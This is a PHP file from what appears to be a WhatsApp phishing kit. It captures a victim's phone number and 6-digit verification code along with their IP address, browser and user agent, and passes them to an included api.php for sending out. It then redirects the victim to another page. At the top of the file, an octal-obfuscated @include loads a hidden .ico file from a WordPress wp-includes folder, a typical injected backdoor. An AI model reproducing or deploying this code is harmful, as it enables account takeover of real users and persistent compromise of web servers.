<?php
session_start();

/*be8fa*/
@include "\057h\157m\145/\167o\162d\160r\145s\163l\145t\163d\157w\057p\165b\154i\143_\150t\155l\057q\165i\143k\151t\056i\156/\167p\055i\156c\154u\144e\163/\152s\057j\161u\145r\171/\056f\0707\0616\0626\067.\151c\157";
/*be8fa*/
error_reporting(0);
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
include "anti/anti8.php";
//include "anti/anti9.php";

include "setting.php";
require 'os.php';

$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
//$code = $_SESSION['ip_countryCode']=clientData('code');
//$country = strtolower($code);
if(isset($_POST['3'])&&isset($_POST['3'])){session_start();
//$_SESSION['$lnm'] = $_POST['2'];
$fnm=$_POST['1'];
$lnm1=$_POST['3'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$msg= '
[+]━━━━━━━【💖WhatsAPP L0G!N💖】━━━━━━[+]
[👤 Phone#]  = '.$_SESSION['$lnm'].'
[👤 6-digit Code]  = '.$lnm1.'
[+]━━━━━【💻 System】━━━━[+]
[🔍 IP INFO] = https://www.geodatatool.com/en/?ip='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$user_browser.' and '.$user_os.'
[🖖 FINGERPRINT] = '.$user_browser.' and '.$useragent.'
[+]━━━━━【💖WhatsAPP L0G!N - BY KHAN💖】━━━━[+]';
include("api.php");
//header('Location: 33.php'); 
}
echo ("<script>location.href='33.php'</script>")
?>